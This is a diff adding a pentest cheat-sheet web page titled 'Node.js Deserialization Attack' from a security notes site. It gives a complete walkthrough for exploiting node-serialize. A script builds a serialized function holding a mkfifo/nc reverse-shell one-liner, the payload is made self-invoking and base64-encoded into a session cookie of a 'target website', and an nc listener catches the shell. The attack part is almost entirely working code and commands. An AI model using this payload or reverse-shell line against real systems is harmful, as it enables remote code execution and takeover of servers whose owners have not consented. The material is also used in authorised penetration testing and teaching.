@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="readloud">
+    
+    <link rel="shortcut icon" href="../../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Node.js Deserialization Attack - readloud.org</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Node.js Deserialization Attack", url: "#_top", children: [
+              {title: "Cookie Reverse Shell", url: "#cookie-reverse-shell" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+
+    <h1 id="nodejs-deserialization-attack">Node.js Deserialization Attack</h1>
+<p>Node.js deserialization is vulnerable to remote command executions.</p>
+<ul>
+<li><a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">exploiting-node-js-</a></li>
+</ul>
+<h2 id="cookie-reverse-shell">Cookie Reverse Shell</h2>
+<h3 id="1-generate-a-payload">1. Generate a Payload</h3>
+<p>We can use the online tools like <a href="https://npm.runkit.com/node-serialize">RunKit</a> to execute the node package.<br />
+If you want to do in your local environment, you need to install a npm package first.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>mkdir test
+</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>cd test
+</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>npm install node-serialize
+</span></code></pre></div>
+<p>Next, create the payload for serialization to execute a reverse shell.<br />
+For instance, the file is named “serialize.js”.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>let y = {
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>  rce: function() {
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>    require(&#39;child_process&#39;).exec(&#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;local-ip&gt; &lt;local-port&gt; &gt;/tmp/f&#39;, function(error, stdout, stderr) { console.log(stdout); });
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>  },
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a>};
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a>let serialize = require(&#39;node-serialize&#39;);
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a>console.log(&quot;Serialized: \n&quot; + serialize.serialize(y));
+</span></code></pre></div>
+<p>In the above code, change <strong>"\&lt;local-ip&gt;"</strong> and <strong>"\&lt;local-port&gt;"</strong> to match your environment.  </p>
+<p>Execute node to generate the payload.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>node serialize.js
+</span></code></pre></div>
+<p>Our payload generated in terminal.<br />
+Next, we need to add IIFE brackets <strong>"()"</strong> after the function in the generated payload. By doing this, the function will invoke when the object created. For details, please see <a href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/">the awesome post</a>.</p>
+<p>The final payload is as below:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>{&quot;rce&quot;:&quot;_$$ND_FUNC$$_function() {require(&#39;child_process&#39;).exec(&#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;local-ip&gt; &lt;local-port&gt; &gt;/tmp/f&#39;, (error, stdout, stderr) =&gt; { console.log(stdout); }); } ()&quot;}
+</span></code></pre></div>
+<p>In addition, edit the key name (<strong>”rce”</strong>) and remove <strong>“\n”</strong> characters as you want.</p>
+<h3 id="2-encode-a-payload-by-base64-and-add-to-cookie">2. Encode a Payload by Base64 and Add to Cookie</h3>
+<p>Copy the above json object and encode it by Base64, then copy the encoded text.<br />
+Paste it to the Cookie value of HTTP header in target website.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Cookie: session=eyJyY2U...iAgfSJ9==
+</span></code></pre></div>
+<h3 id="3-execute-reverse-shell">3. Execute Reverse Shell</h3>
+<p>Start a listener for reverse shell</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>nc -lvnp &lt;local-port&gt;
+</span></code></pre></div>
+<p>In target website, reload the page.<br />
+You should get a shell.</p>
+
+  <br>
+    
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+      <p>
+        <a href="https://github.com/readloud/readloud.github.io/releases/tag/themes/edit/master/docs/web/security-risk/nodejs-deserialization-attack.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/noraj/mkdocs-windmill-dark">Windmill Dark</a> theme by Alexandre ZANNI (noraj).</p>
+<p>        ⚠️ The quieter you become, the more you are able to hear 🥷</p>
+</footer>
+
+</body>
+</html>
